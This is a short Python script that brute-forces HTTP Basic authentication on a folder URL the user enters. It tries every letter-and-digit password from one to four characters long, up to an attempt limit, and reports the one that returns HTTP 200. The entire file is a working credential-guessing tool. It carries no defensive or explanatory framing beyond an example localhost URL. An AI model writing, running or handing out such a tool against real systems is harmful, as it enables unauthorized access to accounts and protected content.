import requests
from itertools import product
import string

# Get inputs from the user
url = input("Enter the URL of the protected folder (e.g., http://localhost/protected/): ").strip()
username = input("Enter the username: ").strip()
max_attempts = int(input("Enter the maximum number of attempts: ").strip())

# Define possible characters and password length range
characters = string.ascii_letters + string.digits
min_length = 1
max_length = 4  # Adjust based on your needs

# Logging setup
attempts = 0
success = False

# Function to try a password
def try_password(password):
    global attempts
    attempts += 1
    print(f"Attempt {attempts}: Trying password '{password}'")
    response = requests.get(url, auth=(username, password))
    if response.status_code == 200:
        print(f"[SUCCESS] Password found: {password}")
        return True
    return False

# Generate password combinations and test them
for length in range(min_length, max_length + 1):
    for password_tuple in product(characters, repeat=length):
        if attempts >= max_attempts:
            print("[FAILURE] Maximum number of attempts reached.")
            success = False
            break
        password = ''.join(password_tuple)
        if try_password(password):
            success = True
            break
    if success:
        break

if not success:
    print("[FAILURE] Password not found in the given range or within the attempt limit.")
